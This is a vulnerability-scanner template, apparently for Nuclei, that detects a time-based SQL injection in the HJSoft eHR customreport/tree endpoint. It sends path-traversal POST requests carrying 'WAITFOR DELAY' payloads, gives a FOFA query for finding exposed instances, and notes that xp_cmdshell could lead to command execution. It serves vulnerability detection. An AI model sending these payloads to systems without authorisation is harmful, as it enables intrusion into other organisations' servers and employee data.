http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          id=1';WAITFOR DELAY '0:0:4'--+&codeset=UN&priv=1&level=
        - |
          POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          id=1';WAITFOR DELAY '0:0:8'--+&codeset=UN&priv=1&level=
id: hjeHR-customreport_tree-sql-time
info:
    author: Superhero
    description: |-
        fofa: app="HJSOFT-HCM"
        宏景eHR customreport/tree 接口处存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
    name: 宏景eHR customreport/tree SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/AZOe04vPeY6RBxGt8sVCjw
    severity: high
    tags:
        - 宏景ehr
        - HJSoft-HCM
        - Servlet
